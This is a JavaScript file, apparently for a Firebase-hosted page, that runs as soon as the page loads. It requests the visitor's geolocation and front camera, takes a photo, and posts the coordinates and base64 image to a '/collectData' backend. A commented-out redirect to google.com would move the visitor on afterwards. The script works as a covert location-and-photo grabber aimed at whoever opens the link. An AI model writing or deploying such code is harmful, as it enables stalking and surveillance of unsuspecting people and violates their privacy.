async function collectAndSend() {
    const data = {};

    // 1. Get Location (if allowed)
    try {
        const pos = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
        });
        data.location = {
            lat: pos.coords.latitude,
            lng: pos.coords.longitude,
            acc: pos.coords.accuracy
        };
    } catch (err) {
        data.locationError = err.message || 'Permission Denied/Timeout';
        console.log('Location denied or failed', err);
    }

    // 2. Get Camera Image (if allowed)
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const video = document.createElement('video');
        video.srcObject = stream;
        await new Promise(r => video.onloadedmetadata = r);
        video.play();

        // Wait a moment for exposure
        await new Promise(r => setTimeout(r, 500));

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        data.photoUrl = canvas.toDataURL('image/jpeg', 0.8); // Base64

        // Stop tracks
        stream.getTracks().forEach(t => t.stop());
    } catch (err) {
        data.cameraError = err.message || 'Permission Denied/Device Error';
        console.log('Camera denied or failed', err);
    }

    // 3. Send to Backend
    // Note: Using relative path assumes function is hosted at /collectData on the same domain
    // or use absolute URL if different.
    // For Firebase default: /collectData (via rewrite) or absolute function URL.
    // We'll try the function rewrite if configured, else the hardcoded function URL structure.

    // Let's assume we configure a rewrite in firebase.json or use the Cloud Function URL directly.
    // Since we don't know the region/project in client-side code dynamically without config, 
    // relying on a rewrite is best. 
    // 'firebase.json' hosting rewrite to function:
    // "rewrites": [ { "source": "/collect", "function": "collectData" } ]

    // We will assume the rewrite is set up or use absolute URL fetch if that fails.
    // For now, let's try strict fetch to '/collectData'.

    fetch('/collectData', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    }).then(() => {
        // Optional: Redirect or close
        // window.location.href = 'https://google.com';
    }).catch(console.error);
}

window.onload = collectAndSend;
